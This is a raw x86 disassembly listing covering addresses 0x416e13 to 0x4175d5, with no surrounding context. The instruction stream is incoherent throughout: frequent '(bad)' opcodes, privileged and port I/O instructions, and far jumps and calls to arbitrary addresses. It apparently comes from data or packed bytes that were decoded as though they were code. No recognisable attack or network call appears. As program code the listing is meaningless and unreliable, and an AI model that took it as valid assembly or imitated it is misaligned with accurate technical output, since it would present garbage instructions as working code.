  416e13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e14:	mov    ah,BYTE PTR [ebp-0x7a6b9c3f]
  416e1a:	push   edx
  416e1b:	or     ah,cl
  416e1d:	or     edx,DWORD PTR ds:[esi]
  416e20:	fdiv   DWORD PTR [esi]
  416e22:	gs rcl bh,1
  416e25:	(bad)  
  416e26:	retf   
  416e27:	push   0xffffff9c
  416e29:	inc    eax
  416e2a:	adc    eax,0x66e9b668
  416e2f:	or     eax,0x21a911c9
  416e34:	outs   dx,BYTE PTR ds:[esi]
  416e35:	mov    eax,ds:0x9230e895
  416e3a:	mov    bh,0x16
  416e3c:	cmp    eax,0x85a40912
  416e41:	sar    DWORD PTR [ecx+0x28f6d86f],1
  416e47:	mov    edi,0xf94350eb
  416e4c:	lods   al,BYTE PTR ds:[esi]
  416e4d:	(bad)  
  416e4e:	in     eax,0x71
  416e50:	test   eax,0xb46d566d
  416e55:	lahf   
  416e56:	es div edi
  416e59:	inc    edi
  416e5a:	ror    DWORD PTR [eax-0x50],1
  416e5d:	pop    ds
  416e5e:	test   ebp,esi
  416e60:	inc    esi
  416e61:	mov    edx,0xd489be95
  416e66:	std    
  416e67:	pop    ss
  416e68:	sbb    ch,BYTE PTR [edx]
  416e6a:	sbb    BYTE PTR [ebx+ebx*2-0x43d9c655],dl
  416e71:	jbe    0x416ed5
  416e73:	xor    esi,DWORD PTR [eax+0x7a]
  416e76:	inc    esp
  416e77:	je     0x416e2a
  416e79:	sar    DWORD PTR [ecx],cl
  416e7b:	or     BYTE PTR [ebp-0x1b],ch
  416e7e:	jecxz  0x416eeb
  416e80:	jmp    0x416e39
  416e82:	fs xchg ebx,eax
  416e84:	clc    
  416e85:	cmp    esi,DWORD PTR [eax]
  416e87:	(bad)  
  416e88:	loopne 0x416e36
  416e8a:	push   ebp
  416e8b:	lock dec esp
  416e8d:	loop   0x416e62
  416e8f:	cmp    BYTE PTR [edi+0x49],ah
  416e92:	dec    ebx
  416e93:	adc    eax,0xa094fc11
  416e99:	mov    bh,0xf8
  416e9b:	dec    ecx
  416e9c:	mul    BYTE PTR [ecx-0x27]
  416e9f:	sti    
  416ea0:	repz add eax,0xa0deb3af
  416ea6:	gs add al,0x1a
  416ea9:	and    DWORD PTR [ebp-0x2e1e55e5],esi
  416eaf:	dec    edx
  416eb0:	repz icebp 
  416eb2:	jne    0x416ec7
  416eb4:	inc    ebx
  416eb5:	cdq    
  416eb6:	in     eax,dx
  416eb7:	and    eax,0xd18384
  416ebc:	into   
  416ebd:	jnp    0x416e49
  416ebf:	jp     0x416e65
  416ec1:	jge    0x416e48
  416ec3:	fadd   QWORD PTR [edx+esi*4]
  416ec6:	stos   BYTE PTR es:[edi],al
  416ec7:	xor    al,0xe7
  416ec9:	xchg   ebp,eax
  416eca:	loop   0x416ea1
  416ecc:	daa    
  416ecd:	xchg   ecx,eax
  416ece:	aas    
  416ecf:	mov    al,ds:0x21e584fd
  416ed4:	add    DWORD PTR [edi+0x1495f605],ebp
  416eda:	shl    eax,cl
  416edc:	inc    ebp
  416edd:	js     0x416eff
  416edf:	call   0x6bfb:0x5bf9498
  416ee6:	stos   DWORD PTR es:[edi],eax
  416ee7:	adc    eax,0x8d60dc0f
  416eed:	daa    
  416eee:	push   0xe
  416ef0:	ja     0x416f4b
  416ef2:	mov    esp,0x8ec0b01c
  416ef7:	dec    edi
  416ef8:	fdiv   QWORD PTR [ebx-0x62]
  416efb:	aas    
  416efc:	mov    al,ds:0x6a9fde3
  416f01:	add    eax,0x8e86aa83
  416f06:	fst    QWORD PTR [esi+0x15479787]
  416f0c:	popf   
  416f0d:	leave  
  416f0e:	cmp    al,0xa3
  416f10:	cmp    cl,BYTE PTR [ecx]
  416f12:	cmp    eax,0x479234f9
  416f17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f18:	ficomp DWORD PTR [edx]
  416f1a:	push   0x42
  416f1c:	enter  0xc9c5,0xd7
  416f20:	cmp    DWORD PTR [ecx-0x1a],esp
  416f23:	ds sbb al,0x95
  416f26:	sbb    eax,DWORD PTR [edi+ebp*2]
  416f29:	test   DWORD PTR [eax],ecx
  416f2b:	imul   esp,DWORD PTR [ebx+0x52],0xe77d3426
  416f32:	cmp    al,dl
  416f34:	sahf   
  416f35:	push   eax
  416f36:	cld    
  416f37:	push   0x6c
  416f39:	loope  0x416f2a
  416f3b:	dec    esp
  416f3c:	inc    ebx
  416f3d:	xor    BYTE PTR [eax+0x2d],0x3
  416f41:	iret   
  416f42:	pop    eax
  416f43:	into   
  416f44:	adc    cl,dh
  416f46:	sbb    DWORD PTR [eax+0x2],ecx
  416f49:	pop    ebx
  416f4a:	repnz push cs
  416f4c:	ss pushf 
  416f4e:	rcl    DWORD PTR [eax+0x1c88596c],0x64
  416f55:	xlat   BYTE PTR ds:[ebx]
  416f56:	xor    DWORD PTR [esp+eax*8+0x62],0x27
  416f5b:	ja     0x416f8a
  416f5d:	cmp    BYTE PTR [esp+eax*8-0x4f],dl
  416f61:	mov    eax,0x4f48d302
  416f66:	out    0xc1,eax
  416f68:	push   eax
  416f69:	out    dx,eax
  416f6a:	mov    dh,0x0
  416f6c:	pushf  
  416f6d:	sub    DWORD PTR [bx+di],esp
  416f70:	mov    dl,0x5e
  416f72:	pop    edi
  416f73:	out    dx,eax
  416f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f75:	jbe    0x416f71
  416f77:	iret   
  416f78:	popf   
  416f79:	sbb    eax,0x4caaccf2
  416f7e:	fnclex 
  416f80:	ss arpl dx,bx
  416f83:	adc    bh,BYTE PTR [ecx+ebx*1]
  416f86:	ins    BYTE PTR es:[edi],dx
  416f87:	mov    esi,0x285fb2fc
  416f8c:	xor    ebx,0xffffffa2
  416f8f:	or     al,0x54
  416f91:	(bad)  
  416f92:	cmp    al,0xa0
  416f94:	in     al,0xf
  416f96:	dec    ebx
  416f97:	shl    esp,cl
  416f99:	(bad)  
  416f9a:	adc    DWORD PTR [ecx-0x3e],ecx
  416f9d:	(bad)  
  416f9e:	cmp    al,0x54
  416fa0:	lea    edx,[eax+0x57]
  416fa3:	fidiv  DWORD PTR [esi]
  416fa5:	mov    al,0x3
  416fa7:	aad    0xf4
  416fa9:	add    al,0xe4
  416fab:	sub    eax,0xb0651ede
  416fb0:	push   ebp
  416fb1:	mov    edi,0xfeaa4b3f
  416fb6:	xchg   esp,eax
  416fb7:	das    
  416fb8:	(bad)  [edi]
  416fba:	repz cli 
  416fbc:	xchg   DWORD PTR [edx+0x4e5df266],esp
  416fc2:	fdivr  QWORD PTR [ebx+0x1a695147]
  416fc8:	scas   eax,DWORD PTR es:[edi]
  416fc9:	xchg   esp,eax
  416fca:	lods   eax,DWORD PTR ds:[esi]
  416fcb:	and    esp,DWORD PTR [edi+0x50]
  416fce:	cmp    eax,DWORD PTR [edi+0x56799d9f]
  416fd4:	aas    
  416fd5:	push   eax
  416fd6:	mov    ebp,0x8c1028ee
  416fdb:	js     0x416fcd
  416fdd:	icebp  
  416fde:	lea    edx,[edx+0x32]
  416fe1:	or     al,0x15
  416fe3:	imul   edi,DWORD PTR [edx],0xffffffd7
  416fe6:	cmp    eax,0x747c0254
  416feb:	and    ecx,DWORD PTR [esi+0x106ffc51]
  416ff1:	addr16 sub sp,dx
  416ff5:	push   eax
  416ff6:	stos   BYTE PTR es:[edi],al
  416ff7:	mov    al,0x63
  416ffa:	data16 mov ah,0xde
  416ffd:	push   esi
  416ffe:	push   ebp
  416fff:	sub    eax,0x38a27edd
  417004:	shl    BYTE PTR [eax+0x704fa54b],1
  41700a:	cs (bad) 
  41700c:	test   DWORD PTR [ebp+eax*8+0x3647676a],0x9eedf5e4
  417017:	push   0xffffff8c
  417019:	enter  0x6cd1,0xb7
  41701d:	mov    ch,0xd6
  41701f:	(bad)  
  417020:	adc    ebp,ecx
  417022:	test   al,0xb0
  417024:	lahf   
  417025:	les    edx,FWORD PTR [ebx-0x600141b]
  41702b:	sbb    DWORD PTR [ebp+0xb],0x1e
  41702f:	mov    cl,0x83
  417031:	add    al,BYTE PTR [ebx-0xf]
  417034:	scas   al,BYTE PTR es:[edi]
  417035:	sub    BYTE PTR [ecx+ebx*8-0x23],al
  417039:	jnp    0x417075
  41703b:	dec    esp
  41703c:	mov    WORD PTR [edi+0x74a92ebf],fs
  417042:	in     al,dx
  417043:	test   dh,al
  417045:	cwde   
  417046:	rcl    DWORD PTR [ebp+0x34f17a19],cl
  41704c:	inc    eax
  41704d:	push   DWORD PTR [eax-0x6d]
  417050:	ret    0x77e3
  417053:	(bad)  
  417054:	push   ss
  417055:	adc    cl,cl
  417057:	ficomp WORD PTR [eax]
  417059:	mov    edi,0x2aa4fdcd
  41705e:	ror    DWORD PTR [ebx+0x4b],0x2a
  417062:	enter  0xf25d,0xbe
  417066:	sbb    edi,DWORD PTR [esi]
  417068:	push   ds
  417069:	scas   eax,DWORD PTR es:[edi]
  41706a:	fs cmp bh,ah
  41706d:	mov    ebp,0xc2908bbd
  417072:	scas   al,BYTE PTR es:[edi]
  417073:	push   0xffffff89
  417075:	mov    bh,0xbf
  417077:	rcl    BYTE PTR [edx],cl
  417079:	test   al,0xe8
  41707b:	ficom  DWORD PTR [ebx]
  41707d:	fs jns 0x417005
  417080:	pop    edi
  417081:	in     al,dx
  417082:	loope  0x4170f9
  417084:	mov    al,ds:0x52643d95
  417089:	addr16 mov al,0xf4
  41708c:	pop    ecx
  41708d:	jo     0x41710c
  41708f:	dec    ebp
  417090:	repnz push ebx
  417092:	pop    es
  417093:	mov    bh,BYTE PTR [eax]
  417095:	cmp    al,0xa2
  417097:	pop    eax
  417098:	das    
  417099:	jle    0x4170bc
  41709b:	outs   dx,DWORD PTR ds:[esi]
  41709c:	stc    
  41709d:	fist   DWORD PTR [edx-0x5a]
  4170a0:	test   dh,ah
  4170a2:	cmc    
  4170a3:	inc    sp
  4170a5:	sub    eax,esp
  4170a7:	inc    ebp
  4170a8:	mov    DWORD PTR [eax+0x37bf9deb],edx
  4170ae:	dec    edi
  4170af:	imul   ecx,DWORD PTR [esp+edx*4],0xcac412c0
  4170b6:	gs out 0x8,eax
  4170b9:	daa    
  4170ba:	test   BYTE PTR [ebp+0x1a],0xad
  4170be:	inc    edi
  4170bf:	aaa    
  4170c0:	fwait
  4170c1:	jmp    0xfc8f705d
  4170c6:	into   
  4170c7:	jae    0x417124
  4170c9:	mov    esp,0x485b2a84
  4170ce:	push   eax
  4170cf:	out    0x49,al
  4170d1:	leave  
  4170d2:	dec    eax
  4170d3:	xor    eax,0xc1a20bac
  4170d8:	xchg   esi,eax
  4170d9:	sub    esp,DWORD PTR [ebp-0x28b61ce5]
  4170df:	push   edi
  4170e0:	test   al,0xa6
  4170e2:	mov    ch,0x4a
  4170e4:	rcl    BYTE PTR [eax+0x277b4512],cl
  4170ea:	out    0x2a,eax
  4170ec:	cmp    eax,0xfb11dbd1
  4170f1:	outs   dx,DWORD PTR gs:[esi]
  4170f3:	(bad)  
  4170f4:	and    DWORD PTR [edi-0x59c0bd8],ecx
  4170fa:	lahf   
  4170fb:	das    
  4170fc:	mov    ebp,0x8878a409
  417101:	in     al,0x2c
  417103:	sub    DWORD PTR [ecx+0x5f2cc65a],eax
  417109:	mov    ebx,0xb7c40e6d
  41710e:	xor    edi,DWORD PTR gs:[eax-0x3a]
  417112:	sbb    BYTE PTR [esi+esi*8-0x308cbe19],al
  417119:	and    eax,0x440e87de
  41711e:	in     al,dx
  41711f:	int3   
  417120:	mov    ds:0xbbdbd27,al
  417125:	inc    ebx
  417126:	jmp    0x5658f543
  41712b:	retf   
  41712c:	mov    ah,0x63
  41712e:	mov    al,0xa9
  417130:	xchg   ebp,eax
  417131:	outs   dx,DWORD PTR ds:[esi]
  417132:	pop    esp
  417133:	push   ebx
  417134:	invd   
  417136:	push   ebp
  417137:	bound  esp,QWORD PTR [edi]
  417139:	std    
  41713a:	fisubr DWORD PTR [ecx-0x3d]
  41713d:	and    ch,ah
  41713f:	cdq    
  417140:	mov    dh,BYTE PTR [edi+0x2894f48c]
  417146:	inc    ebp
  417147:	and    BYTE PTR [ebx-0x35504991],dl
  41714d:	pushf  
  41714e:	ja     0x41718f
  417150:	jns    0x41717e
  417152:	scas   al,BYTE PTR es:[edi]
  417153:	add    esi,ebx
  417155:	int    0xf2
  417157:	(bad)  
  417158:	call   0xf8d0:0x53c9896c
  41715f:	sub    al,0x7b
  417161:	imul   ebp,ecx,0x6486810a
  417167:	aaa    
  417168:	xor    eax,0xb0c169bd
  41716d:	pop    edi
  41716e:	sub    cl,BYTE PTR [esi+0x60]
  417171:	mov    dl,0x11
  417173:	add    al,0xb7
  417175:	mov    al,0x5
  417177:	scas   al,BYTE PTR es:[edi]
  417178:	scas   al,BYTE PTR es:[edi]
  417179:	in     eax,dx
  41717a:	or     al,0x2c
  41717c:	(bad)  
  41717d:	in     eax,dx
  41717e:	cmp    BYTE PTR [ebx+0x54],bl
  417181:	nop
  417182:	mov    bh,0x7f
  417184:	out    0x82,al
  417186:	data16 int 0x75
  417189:	mov    ebx,0x7765544b
  41718e:	in     al,dx
  41718f:	arpl   cx,di
  417191:	xchg   edi,eax
  417192:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417193:	xor    BYTE PTR [esi+0x12],bh
  417196:	in     eax,dx
  417197:	lods   eax,DWORD PTR ds:[esi]
  417198:	xchg   ebp,eax
  417199:	mov    edi,es
  41719b:	out    0xf3,eax
  41719d:	sub    eax,0xdd9aa12
  4171a2:	and    eax,0x6e3b9c17
  4171a7:	xchg   ebp,eax
  4171a8:	in     al,dx
  4171a9:	lea    ecx,[ebx+0x2ddbd5e1]
  4171af:	(bad)  
  4171b0:	fmulp  st(7),st
  4171b2:	add    al,BYTE PTR ds:0x264e54eb
  4171b8:	jmp    0x796b:0x69b11ff1
  4171bf:	adc    eax,0xd0ac7f62
  4171c4:	in     eax,dx
  4171c5:	mov    dl,0xa0
  4171c7:	hlt    
  4171c8:	out    0xef,al
  4171ca:	addr16 dec edi
  4171cc:	lahf   
  4171cd:	inc    esp
  4171ce:	or     al,0x8e
  4171d0:	ret    0xf63b
  4171d3:	xchg   DWORD PTR [edx-0x45e18069],edi
  4171d9:	sub    al,0x28
  4171db:	mov    BYTE PTR [esi],ah
  4171dd:	pusha  
  4171de:	dec    esp
  4171df:	pop    ebx
  4171e0:	fistp  DWORD PTR [ebp+0x67]
  4171e3:	dec    eax
  4171e4:	ficom  DWORD PTR [ebx]
  4171e6:	outs   dx,BYTE PTR ds:[esi]
  4171e7:	jbe    0x4171ca
  4171e9:	adc    BYTE PTR [edi+0x7736cdf1],dh
  4171ef:	pop    ebp
  4171f0:	xchg   edx,eax
  4171f1:	(bad)  
  4171f2:	and    ch,0xc7
  4171f5:	push   ss
  4171f6:	rol    DWORD PTR [eax+0xa],cl
  4171f9:	adc    eax,0xfa397c1e
  4171fe:	lds    esp,FWORD PTR [ebp-0x57]
  417201:	icebp  
  417202:	pusha  
  417203:	mov    ah,0xa4
  417205:	pushf  
  417206:	hlt    
  417207:	sub    edi,0x63e486a7
  41720d:	xor    eax,0xf8e6e3d9
  417212:	pop    DWORD PTR [ebp-0x14fb687d]
  417218:	pop    ss
  417219:	inc    esi
  41721a:	test   al,0xa2
  41721c:	sbb    eax,0x9ef2f9e0
  417221:	mov    ds:0xa6cab4f4,al
  417226:	push   eax
  417227:	inc    eax
  417228:	cmp    BYTE PTR [ebp-0x1d57e5b2],dh
  41722e:	arpl   sp,bp
  417230:	inc    edx
  417231:	in     eax,dx
  417232:	adc    eax,0xbf6a9303
  417237:	outs   dx,DWORD PTR ds:[esi]
  417238:	int3   
  417239:	mov    esi,0xdc608e17
  41723e:	lods   eax,DWORD PTR ds:[esi]
  41723f:	cs iret 
  417241:	mov    edi,0x935503bd
  417246:	shr    BYTE PTR [ebx+edi*2],0x9e
  41724a:	(bad)  
  41724b:	jle    0x417227
  41724d:	mov    ah,0x65
  41724f:	call   DWORD PTR [ecx+0x7a3255a2]
  417255:	pushf  
  417256:	adc    BYTE PTR [eax+0x58],ch
  417259:	lods   al,BYTE PTR cs:[esi]
  41725b:	or     edx,esp
  41725d:	stos   BYTE PTR es:[edi],al
  41725e:	and    al,0xcf
  417260:	fidivr DWORD PTR [edi]
  417262:	jge    0x417280
  417264:	mov    dl,0x98
  417266:	stos   DWORD PTR es:[edi],eax
  417267:	repz push ecx
  417269:	and    ecx,esp
  41726b:	mov    dh,0xe0
  41726d:	mov    ch,0xb9
  41726f:	stos   DWORD PTR es:[edi],eax
  417270:	addr16 aas 
  417272:	push   0xffffffa5
  417274:	div    BYTE PTR [esi]
  417276:	fsubr  st(0),st
  417278:	xchg   edi,eax
  417279:	repnz shl BYTE PTR [edx],cl
  41727c:	inc    ebp
  41727d:	imul   edi,DWORD PTR [ecx+0x71],0xba4dddb6
  417284:	inc    edi
  417285:	scas   al,BYTE PTR es:[edi]
  417286:	es icebp 
  417288:	jno    0x41721e
  41728a:	push   esi
  41728b:	mov    ds:0xcde0c89f,al
  417290:	jp     0x417311
  417292:	idiv   BYTE PTR [edi+ecx*4+0x6e]
  417296:	cmp    BYTE PTR [esi-0x1a],ah
  417299:	or     DWORD PTR [esi+0x76],ebx
  41729c:	mov    bl,0x84
  41729e:	aam    0xf6
  4172a0:	(bad)  
  4172a1:	out    dx,al
  4172a2:	inc    edx
  4172a3:	inc    ebp
  4172a4:	cmp    DWORD PTR [ebp-0x67b6a031],ebx
  4172aa:	lahf   
  4172ab:	adc    DWORD PTR [ecx],0x21
  4172ae:	or     ecx,eax
  4172b0:	call   0x7420:0x820b65f3
  4172b7:	adc    al,0x38
  4172b9:	adc    dl,BYTE PTR [edx-0x69]
  4172bc:	adc    DWORD PTR [eax-0x3957c7e9],esp
  4172c2:	add    eax,0x452394f9
  4172c7:	or     BYTE PTR [ebp+0x36],0xf6
  4172cb:	or     BYTE PTR [ecx+0x44],0xcb
  4172cf:	ret    
  4172d0:	(bad)  
  4172d1:	adc    dl,dl
  4172d3:	jb     0x4172a0
  4172d5:	test   eax,0xf1154add
  4172da:	and    esi,DWORD PTR ds:0x2983b5aa
  4172e0:	jbe    0x4172de
  4172e2:	int3   
  4172e3:	std    
  4172e4:	pop    ecx
  4172e5:	cli    
  4172e6:	jmp    0x417316
  4172e8:	xchg   edx,eax
  4172e9:	aad    0xb8
  4172eb:	mov    ebx,0xa8c7a5c
  4172f0:	arpl   WORD PTR [edi],si
  4172f2:	mov    edx,0x10a4f563
  4172f7:	or     ch,ah
  4172f9:	jmp    0xf153e852
  4172fe:	xor    edi,DWORD PTR [ebp-0x75]
  417301:	in     eax,0x5d
  417303:	xchg   edi,eax
  417304:	(bad)  
  417305:	mov    esp,0x620f5aca
  41730a:	dec    ecx
  41730b:	nop
  41730c:	ror    DWORD PTR [edx+0x6f],cl
  41730f:	in     al,0x4e
  417311:	pop    ss
  417312:	inc    esp
  417313:	mov    WORD PTR ds:0x699c4161,?
  417319:	lea    ebp,[eax-0x7e]
  41731c:	pinsrw mm7,WORD PTR [ecx],0xfa
  417320:	sbb    al,0xcb
  417322:	mov    bh,BYTE PTR [eax-0x1d544395]
  417328:	in     al,dx
  417329:	outs   dx,BYTE PTR ds:[esi]
  41732a:	aas    
  41732b:	and    DWORD PTR [ecx+0x7f98489c],esp
  417331:	xchg   esp,eax
  417332:	xor    DWORD PTR [esi],0xffffffda
  417335:	add    edx,DWORD PTR [ebp+0x3b403e6a]
  41733b:	xchg   esp,eax
  41733c:	inc    edx
  41733d:	xor    DWORD PTR [bx+di-0x74],ebx
  417341:	dec    edx
  417342:	xor    eax,0x6b7869f3
  417347:	fcom   DWORD PTR [ecx+0x6cc824bb]
  41734d:	(bad)  
  41734e:	jmp    0x504a985f
  417353:	into   
  417354:	retf   
  417355:	and    bl,BYTE PTR [esi+0x5b]
  417358:	scas   al,BYTE PTR es:[edi]
  417359:	ja     0x4172e9
  41735b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41735c:	push   bx
  41735e:	inc    esi
  41735f:	(bad)  
  417360:	mov    ch,0xd3
  417362:	pop    ecx
  417363:	adc    al,0xaa
  417365:	retf   
  417366:	in     al,0xa
  417368:	aad    0xd7
  41736a:	rcr    BYTE PTR [edx+0x5f0ba755],0x8b
  417371:	ret    
  417372:	and    eax,DWORD PTR ds:0x2e7b4067
  417378:	outs   dx,BYTE PTR ds:[esi]
  417379:	mov    DWORD PTR [ebp+eax*4+0x50f9bbcf],ecx
  417380:	adc    esp,DWORD PTR [ebx-0x36a06007]
  417386:	rcl    DWORD PTR [edx],cl
  417388:	cld    
  417389:	xchg   ecx,eax
  41738a:	cli    
  41738b:	ins    DWORD PTR es:[edi],dx
  41738c:	sbb    al,0x5c
  41738e:	adc    al,0xb7
  417390:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417391:	mov    ds:0xea781a2f,al
  417396:	hlt    
  417397:	pop    ds
  417398:	outs   dx,BYTE PTR ds:[esi]
  417399:	xchg   esi,eax
  41739a:	cmp    bl,BYTE PTR [ebx]
  41739c:	std    
  41739d:	rcr    BYTE PTR [edx-0x7ae6a204],cl
  4173a3:	lock fstp QWORD PTR [ecx+ebx*2+0x53]
  4173a8:	mov    ebx,0x4abe9b74
  4173ad:	pop    esi
  4173ae:	mov    ch,0x85
  4173b0:	arpl   WORD PTR [ebx-0x3e56b581],bp
  4173b6:	adc    DWORD PTR [ebx],ebx
  4173b8:	mov    ecx,0x9b620279
  4173bd:	inc    ebx
  4173be:	out    0x88,eax
  4173c0:	test   DWORD PTR [eax],0xc8b77ddf
  4173c6:	pushf  
  4173c7:	inc    esp
  4173c8:	jmp    0xa0789cf8
  4173cd:	push   ebp
  4173ce:	sbb    eax,0xba81cd27
  4173d3:	xchg   esp,eax
  4173d4:	jns    0x417369
  4173d6:	mov    cl,al
  4173d8:	test   al,0x7e
  4173da:	cmp    bl,BYTE PTR [ecx+0x46aeb0cf]
  4173e0:	(bad)  
  4173e1:	jg     0x417398
  4173e3:	in     al,dx
  4173e4:	pop    es
  4173e5:	xor    dl,0x26
  4173e8:	mov    edi,DWORD PTR [edx]
  4173ea:	std    
  4173eb:	mov    edx,0x3ef1a31f
  4173f0:	outs   dx,DWORD PTR ds:[esi]
  4173f1:	xchg   BYTE PTR [ecx],ah
  4173f3:	ins    DWORD PTR es:[edi],dx
  4173f4:	stos   BYTE PTR es:[edi],al
  4173f5:	int3   
  4173f6:	jne    0x417454
  4173f8:	nop
  4173f9:	rcl    ch,1
  4173fb:	mov    cl,bh
  4173fd:	out    0xc1,eax
  4173ff:	push   0xffffff9e
  417401:	mov    cl,0xb8
  417403:	mov    ch,0xa2
  417405:	scas   al,BYTE PTR es:[edi]
  417406:	dec    edx
  417407:	(bad)  
  417408:	push   eax
  417409:	mov    ebx,0xfe0d591b
  41740e:	inc    edx
  41740f:	ficomp WORD PTR [edx-0x71]
  417412:	add    ebx,DWORD PTR [ecx]
  417414:	inc    ebx
  417415:	into   
  417416:	fcmovb st,st(0)
  417418:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417419:	int3   
  41741a:	aas    
  41741b:	inc    esp
  41741c:	mov    ebp,0xfd7fa825
  417421:	and    eax,0xcd48d12
  417426:	sub    dh,BYTE PTR [eax+esi*8-0x35]
  41742a:	push   edi
  41742b:	xor    eax,0xc47b7d28
  417430:	sbb    eax,0x56c8f0e8
  417435:	inc    edi
  417436:	dec    ebx
  417437:	sbb    dh,BYTE PTR fs:[esi]
  41743a:	out    dx,eax
  41743b:	sbb    eax,0x5c85f802
  417440:	sub    DWORD PTR [esi+0x3f],ebp
  417443:	mov    ds:0xe859ae07,eax
  417448:	cdq    
  417449:	mov    eax,0xba4bbc39
  41744e:	dec    ebx
  41744f:	mov    ch,0xec
  417451:	adc    BYTE PTR [ebx-0x2b],ah
  417454:	and    DWORD PTR [ebp+0x18],edx
  417457:	sbb    ch,0xb7
  41745a:	mov    dh,0x39
  41745c:	iret   
  41745d:	xor    esp,ebx
  41745f:	jb     0x4174de
  417461:	adc    edi,edx
  417463:	add    eax,0xa997a9aa
  417468:	jbe    0x417485
  41746a:	in     eax,0x96
  41746c:	mov    ecx,0x670454d3
  417471:	icebp  
  417472:	(bad)
  417475:	add    DWORD PTR [edx],edi
  417477:	fwait
  417478:	or     al,0x29
  41747a:	daa    
  41747b:	jo     0x4174d0
  41747d:	sbb    eax,0x4acd10b8
  417482:	dec    esi
  417483:	cld    
  417484:	repnz or DWORD PTR [edi+ebp*8+0x7ad316ca],0x59d84c8e
  417490:	jno    0x4174a0
  417492:	and    al,al
  417494:	push   ds
  417495:	fisubr WORD PTR [edi+0x65]
  417498:	sub    ah,bh
  41749a:	inc    esp
  41749b:	dec    ebp
  41749c:	push   esp
  41749d:	add    bh,ch
  41749f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174a0:	lods   al,BYTE PTR ds:[esi]
  4174a1:	mov    ch,0x14
  4174a3:	jge    0x41747c
  4174a5:	dec    ecx
  4174a6:	(bad)  
  4174a7:	lods   eax,DWORD PTR ds:[esi]
  4174a8:	sbb    ebx,edx
  4174aa:	adc    al,0x88
  4174ac:	pop    DWORD PTR [ebp-0x5c]
  4174af:	ss push eax
  4174b1:	retf   0x7924
  4174b4:	neg    bl
  4174b6:	loopne 0x4174ee
  4174b8:	dec    eax
  4174b9:	xor    BYTE PTR [ebx+0x2a],0x50
  4174bd:	stos   DWORD PTR es:[edi],eax
  4174be:	int    0x77
  4174c0:	xor    al,0x8b
  4174c2:	adc    edi,DWORD PTR [edx+esi*1+0x69]
  4174c6:	push   edi
  4174c7:	cmp    BYTE PTR [ecx+0x5b],ch
  4174ca:	and    al,0xd7
  4174cc:	dec    DWORD PTR [edx+0x51]
  4174cf:	sbb    eax,0xe652daec
  4174d4:	test   DWORD PTR [ebx],esp
  4174d6:	dec    esp
  4174d7:	shl    DWORD PTR [eax-0x43],cl
  4174da:	add    al,0xa5
  4174dc:	ds stos DWORD PTR es:[edi],eax
  4174de:	and    al,0x34
  4174e0:	jbe    0x41753e
  4174e2:	adc    eax,0xed2d60b2
  4174e7:	ds out 0xac,eax
  4174ea:	jnp    0x4174a7
  4174ec:	cld    
  4174ed:	les    esp,FWORD PTR [eax-0x76]
  4174f0:	retf   
  4174f1:	sbb    al,0xc9
  4174f3:	push   eax
  4174f4:	into   
  4174f5:	shl    DWORD PTR ds:0x39af2c6a,0x80
  4174fc:	into   
  4174fd:	inc    edi
  4174fe:	sbb    DWORD PTR [esi],ecx
  417500:	jmp    0x8dbb:0x668a520d
  417507:	cwde   
  417508:	js     0x417541
  41750a:	scas   eax,DWORD PTR es:[edi]
  41750b:	shl    esi,0x29
  41750e:	shl    BYTE PTR [edi],cl
  417510:	bound  edx,QWORD PTR [eax-0xb]
  417513:	cdq    
  417514:	adc    eax,0x610bc404
  417519:	or     esp,edi
  41751b:	pop    eax
  41751c:	xchg   esi,eax
  41751d:	test   BYTE PTR [esi+0x45],al
  417520:	(bad)  
  417521:	lods   al,BYTE PTR ds:[esi]
  417522:	jb     0x4174e4
  417524:	enter  0xe270,0x88
  417528:	rcl    cl,cl
  41752a:	sar    BYTE PTR [edx+eax*1+0x10],1
  41752e:	xor    al,0xd8
  417530:	push   ss
  417531:	push   eax
  417532:	or     DWORD PTR [ebx+0x755bc0ad],edx
  417538:	inc    eax
  417539:	push   es
  41753a:	in     eax,0x89
  41753c:	add    DWORD PTR [esi],eax
  41753e:	mov    dh,0x92
  417540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417541:	lea    edx,[ebp-0x22]
  417544:	ficom  WORD PTR [esi-0x188c1662]
  41754a:	pop    ecx
  41754b:	std    
  41754c:	test   BYTE PTR [edi],dl
  41754e:	or     edx,esp
  417550:	cdq    
  417551:	in     al,0x1
  417553:	adc    BYTE PTR [ebx],ah
  417555:	pop    ebx
  417556:	(bad)  
  417557:	pop    ecx
  417558:	dec    esp
  417559:	sbb    eax,DWORD PTR [esi-0x7]
  41755c:	and    eax,edi
  41755e:	jne    0x41757e
  417560:	std    
  417561:	dec    esp
  417562:	retf   
  417563:	mov    ds:0xa69a37d9,al
  417568:	scas   al,BYTE PTR es:[edi]
  417569:	sub    al,0x8c
  41756b:	mov    eax,ds:0x4a056a6
  417570:	add    al,cl
  417572:	ds push edi
  417574:	sti    
  417575:	mov    eax,0x66687423
  41757a:	arpl   WORD PTR ds:[ebp-0x61],si
  41757e:	mov    eax,0x39d43631
  417583:	repnz push cs
  417585:	call   0x7315ee19
  41758a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41758b:	shl    BYTE PTR [esi+0x2382b40],1
  417591:	dec    edi
  417592:	mov    dh,0x8d
  417594:	call   0xfeb3:0xcb14b2c7
  41759b:	dec    ebx
  41759c:	mov    bl,0x6c
  41759e:	adc    eax,0x72984151
  4175a3:	bound  ecx,QWORD PTR [ebx+0x2b]
  4175a6:	test   eax,0x1a234eba
  4175ab:	mul    BYTE PTR [ecx]
  4175ad:	repnz add ebx,esi
  4175b0:	pop    edx
  4175b1:	xlat   BYTE PTR ds:[ebx]
  4175b2:	idiv   bl
  4175b4:	ret    0x1317
  4175b7:	sbb    BYTE PTR [eax-0x3e91aa09],0x76
  4175be:	call   DWORD PTR [edx]
  4175c0:	sub    BYTE PTR [eax-0x63],ah
  4175c3:	xor    ah,BYTE PTR [ebp+0x389aa45c]
  4175c9:	xchg   ebx,eax
  4175ca:	popf   
  4175cb:	cld    
  4175cc:	les    esp,FWORD PTR [ecx-0x23]
  4175cf:	jmp    0x4fa405e
  4175d4:	popa   
  4175d5:	jge    0x4175f0
